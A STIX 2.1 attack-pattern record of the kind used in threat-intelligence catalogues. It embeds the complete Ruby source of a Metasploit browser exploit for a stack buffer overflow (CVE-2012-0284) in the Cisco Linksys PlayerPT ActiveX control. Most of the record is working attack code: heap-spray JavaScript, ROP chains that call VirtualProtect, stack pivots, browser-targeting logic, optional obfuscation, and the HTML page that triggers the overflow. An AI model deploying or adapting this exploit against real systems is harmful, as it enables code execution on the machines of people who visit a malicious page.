{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6eec9b1a-209c-438c-89db-1acf50a1f221",
    "created": "2024-08-14T16:43:47.435876Z",
    "modified": "2024-08-14T16:43:47.43588Z",
    "name": "Cisco Linksys PlayerPT ActiveX Control SetSource sURL Argument Buffer Overflow",
    "description": " This module exploits a vulnerability found in Cisco Linksys PlayerPT 1.0.0.15 as the installed with the web interface of Cisco Linksys WVC200 Wireless-G PTZ Internet Video Camera. The vulnerability, due to the insecure usage of sprintf in",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/cisco_playerpt_setsource_surl.rb",
            "external_id": "cisco_playerpt_setsource_surl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0284"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20120808000045/http://secunia.com:80/secunia_research/2012-25/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"9.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :classid    => \"{9E065E4A-BD9D-4547-8F90-985DC62A5591}\",\n  #  :method     => \"SetSource\",\n  #  :rank       => NormalRanking\n  #})\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cisco Linksys PlayerPT ActiveX Control SetSource sURL Argument Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability found in Cisco Linksys PlayerPT 1.0.0.15\n        as the installed with the web interface of Cisco Linksys WVC200 Wireless-G PTZ\n        Internet Video Camera. The vulnerability, due to the insecure usage of sprintf in\n        the SetSource method, when handling a specially crafted sURL argument, allows to\n        trigger a stack based buffer overflow which leads to code execution under the\n        context of the user visiting a malicious web page.\n      },\n      'Author'         =>\n        [\n          'Carsten Eiram', # Vuln discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-0284' ],\n          [ 'OSVDB', '84309'],\n          [ 'BID', '54588' ],\n          [ 'URL', 'http://web.archive.org/web/20120808000045/http://secunia.com:80/secunia_research/2012-25/' ],\n\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space' => 1024,\n          'DisableNops' => true,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'IE 6 on Windows XP SP3',\n            {\n              'SprayBlocks' => 0x185,\n              'SprayOffset' => '0x0',\n              'Ret' => 0x0c0c0c0c,\n              'Rop' => nil,\n              'RandomHeap' => false\n            }\n          ],\n          [\n            'IE 7 on Windows XP SP3 / Windows Vista SP2',\n            {\n              'SprayBlocks' => 0x185,\n              'SprayOffset' => '0x0',\n              'Ret' => 0x0c0c0c0c,\n              'Rop' => nil,\n              'RandomHeap' => false\n            }\n          ],\n          [\n            'IE 8 on Windows XP SP3',\n            {\n              'SprayBlocks' => 0x185,\n              'SprayOffset' => '0x0',\n              'Ret' => 0x77c3546b, # ret from msvcrt\n              'StackPivot_1' => 0x77c3546a, # pop ebp; ret from msvcrt\n              'StackPivot_2' => 0x77c35468, # mov esp,ebp; pop ebp; ret from msvcrt\n              'Rop' => :msvcrt,\n              'RopChainOffset' => '0x5f4',\n              'RandomHeap' => false\n            }\n          ],\n          [\n            'IE 8 with Java 6 on Windows XP SP3',\n            {\n              'SprayBlocks' => 0x185,\n              'SprayOffset' => '0x0',\n              'Ret' => 0x7c3424f2, # ret from msvcr71.dll\n              'StackPivot_1' => 0x7c3424f1, # pop ebp; ret from msvcr71.dll\n              'StackPivot_2' => 0x7c3424ef, # mov esp,ebp; pop ebp; ret from msvcr71.dll\n              'Rop' => :jre,\n              'RopChainOffset' => '0x5f4',\n              'RandomHeap' => false\n            }\n          ],\n          [\n            'IE 8 with Java 6 on Windows 7 SP1/Vista SP2',\n            {\n              'SprayBlocks' => 0x185,\n              'SprayOffset' => '0x0',\n              'Ret' => 0x7c3424f2, # ret from msvcr71.dll\n              'StackPivot_1' => 0x7c3424f1, # pop ebp; ret from msvcr71.dll\n              'StackPivot_2' => 0x7c3424ef, # mov esp,ebp; pop ebp; ret from msvcr71.dll\n              'Rop' => :jre,\n              'RopChainOffset' => '0x5f4',\n              'RandomHeap' => false\n            }\n          ],\n          [\n            'IE 9 with Java 6 on Windows 7 SP1',\n            {\n              'SprayBlocks' => 0x1000,\n              'SprayOffset' => '0x0',\n              'Ret' => 0x7c3424f2, # ret from msvcr71.dll\n              'StackPivot_1' => 0x7c3424f1, # pop ebp; ret from msvcr71.dll\n              'StackPivot_2' => 0x7c3424ef, # mov esp,ebp; pop ebp; ret from msvcr71.dll\n              'Rop' => :jre,\n              'RopChainOffset' => '0x5fe',\n              'RandomHeap' => true,\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-07-17',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ], self.class\n    )\n\n  end\n\n  def get_easy_spray(t, js_code, js_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n\n    var offset = nops.substring(0, #{t['SprayOffset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n    for (var z=1; z < #{t['SprayBlocks']}; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    return spray\n\n  end\n\n  def get_aligned_spray(t, js_rop, js_code, js_nops, js_90_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    var nops_90 = unescape(\"#{js_90_nops}\");\n    var rop_chain = unescape(\"#{js_rop}\");\n\n    while (nops.length < 0x80000) nops += nops;\n    while (nops_90.length < 0x80000) nops_90 += nops_90;\n\n    var offset = nops.substring(0, #{t['SprayOffset']});\n    var nops_padding = nops.substring(0, #{t['RopChainOffset']}-code.length-offset.length);\n    var shellcode = offset + code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);\n\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n\n    heap_obj.gc();\n    for (var z=1; z < #{t['SprayBlocks']}; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    return spray\n\n  end\n\n  # Spray published by corelanc0d3r\n  # Exploit writing tutorial part 11 : Heap Spraying Demystified\n  # See https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/\n  def get_random_spray(t, js_rop, js_code, js_90_nops)\n\n    spray = <<-JS\n\n    function randomblock(blocksize)\n    {\n      var theblock = \"\";\n      for (var i = 0; i < blocksize; i++)\n      {\n        theblock += Math.floor(Math.random()*90)+10;\n      }\n      return theblock;\n    }\n\n    function tounescape(block)\n    {\n      var blocklen = block.length;\n      var unescapestr = \"\";\n      for (var i = 0; i < blocklen-1; i=i+4)\n      {\n        unescapestr += \"%u\" + block.substring(i,i+4);\n      }\n      return unescapestr;\n    }\n\n    var heap_obj = new heapLib.ie(0x10000);\n\n    var rop = unescape(\"#{js_rop}\");\n    var code = unescape(\"#{js_code}\");\n    var nops_90 = unescape(\"#{js_90_nops}\");\n\n    while (nops_90.length < 0x80000) nops_90 += nops_90;\n\n    var offset_length = #{t['RopChainOffset']};\n\n    for (var i=0; i <  #{t['SprayBlocks']}; i++) {\n      var padding = unescape(tounescape(randomblock(0x1000)));\n      while (padding.length < 0x1000) padding+= padding;\n      var junk_offset = padding.substring(0, offset_length - code.length);\n      var single_sprayblock = code + junk_offset + rop + nops_90.substring(0, 0x800 - code.length - junk_offset.length - rop.length);\n      while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n      sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n      heap_obj.alloc(sprayblock);\n    }\n\n    JS\n\n    return spray\n  end\n\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\").first\n  end\n\n  def get_stack_pivot(t)\n    stack_pivot = [\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      t['StackPivot_1'], # pop ebp # ret # ESP points here after controlling EIP with overflow\n      0x0c0c0c08,        # ebp\n      t['StackPivot_2']  # mov esp,ebp # pop ebp # ret\n    ].pack(\"V*\")\n\n    return stack_pivot\n  end\n\n  def get_rop_chain(t)\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n      when :msvcrt\n        print_status(\"Using msvcrt ROP\")\n        rop =\n          [\n            0x77C21891,  # POP ESI # RETN\n            0x0c0c0c04,  # ESI\n            0x77c4e392,  # POP EAX # RETN\n            0x77c11120,  # <- *&VirtualProtect()\n            0x77c2e493,  # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN\n            junk,\n            0x77c2dd6c,  # XCHG EAX,ESI # ADD BYTE PTR [EAX],AL # RETN\n            0x77c4ec00,  # POP EBP # RETN\n            0x77c35459,  # ptr to 'push esp #  ret'\n            0x77c47705,  # POP EBX # RETN\n            0x00001000,  # EBX\n            0x77c3ea01,  # POP ECX # RETN\n            0x77c5d000,  # W pointer (lpOldProtect) (-> ecx)\n            0x77c46100,  # POP EDI # RETN\n            0x77c46101,  # ROP NOP (-> edi)\n            0x77c4d680,  # POP EDX # RETN\n            0x00000040,  # newProtect (0x40) (-> edx)\n            0x77c4e392,  # POP EAX # RETN\n            nop,         # NOPS (-> eax)\n            0x77c12df9,  # PUSHAD # RETN\n          ].pack(\"V*\")\n\n      when :jre\n        print_status(\"Using JRE ROP\")\n        rop =\n          [\n            0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN\n            0x00001000,  # (dwSize)\n            0x7c347f98,  # RETN (ROP NOP)\n            0x7c3415a2,  # JMP [EAX]\n            0xffffffff,\n            0x7c376402,  # skip 4 bytes\n            0x7c345255,  # INC EBX # FPATAN # RETN\n            0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN\n            0x7c344f87,  # POP EDX # RETN\n            0x00000040,  # flNewProtect\n            0x7c34d201,  # POP ECX # RETN\n            0x7c38b001,  # &Writable location\n            0x7c347f97,  # POP EAX # RETN\n            0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]\n            0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN\n            0x7c345c30,  # ptr to 'push esp #  ret '\n          ].pack(\"V*\")\n    end\n\n    return rop\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows Vista SP2\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[3]  #IE 8 on Windows XP SP3\n    elsif agent =~ /NT 6\\.[01]/ and agent =~ /MSIE 8/\n      return targets[5]  #IE 8 on Windows 7 SP1/Vista SP2\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 9/\n      return targets[6]  #IE 9 on Windows 7 SP1\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    print_status(\"User-agent: #{agent}\")\n\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have a setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    p = payload.encoded\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n    js_90_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n\n    if not my_target['Rop'].nil?\n      js_rop = Rex::Text.to_unescape(get_rop_chain(my_target), Rex::Arch.endian(my_target.arch))\n    end\n\n    js = \"\"\n\n    if my_target['RandomHeap']\n      js = get_random_spray(my_target, js_rop, js_code, js_90_nops)\n    elsif not my_target['Rop'].nil?\n      js = get_aligned_spray(my_target, js_rop, js_code, js_nops, js_90_nops)\n    else\n      js = get_easy_spray(my_target, js_code, js_nops)\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    sploit = \"http://\"\n    sploit << \"\\x0c\" * 261\n    sploit << [my_target.ret].pack(\"V\")\n    if not my_target['Rop'].nil?\n      sploit << get_stack_pivot(my_target)\n    end\n    sploit << \"/img/video.asf\"\n\n    html = <<-MYHTML\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid='clsid:9E065E4A-BD9D-4547-8F90-985DC62A5591' id='obj' /></object>\n    <script>\n      obj.SetSource(\"#{sploit}\",\"mpeg\",\"\",\"\",\"\");\n    </script>\n    </body>\n    </html>\n    MYHTML\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-07-17",
    "x_mitre_platforms": [
        "win'"
    ]
}